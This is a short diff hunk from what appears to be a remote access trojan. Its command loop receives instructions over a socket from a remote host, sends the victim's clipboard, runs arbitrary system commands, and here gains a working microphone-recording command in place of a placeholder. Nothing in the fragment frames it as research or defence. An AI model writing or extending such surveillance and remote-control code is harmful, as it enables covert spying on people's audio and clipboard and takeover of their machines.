@@ -49,7 +49,7 @@ def run(host, port):
             elif command == "clipboard":
                 send_clipboard(client_socket)
             elif command[:21] == "mic_record --duration":
-                pass
+                mic_record(client_socket, command)
             else:  # * Run Other System Commands
                 execute_system_command(client_socket, command)
     except:
